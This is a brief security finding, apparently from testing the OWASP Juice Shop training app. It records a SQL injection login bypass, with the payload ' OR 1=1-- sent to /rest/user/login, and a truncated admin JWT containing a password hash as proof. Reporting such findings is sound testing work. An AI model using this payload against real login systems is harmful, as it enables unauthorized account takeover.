summary: SQL injection in login - authenticated as admin
body:
Using email: ' OR 1=1-- (any password) in POST /rest/user/login resulted in successful authentication as admin@juice-sh.op (user id 1, admin role). Response included JWT token for admin user.
Proof: {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIi...,"umail":"admin@juice-sh.op"}}
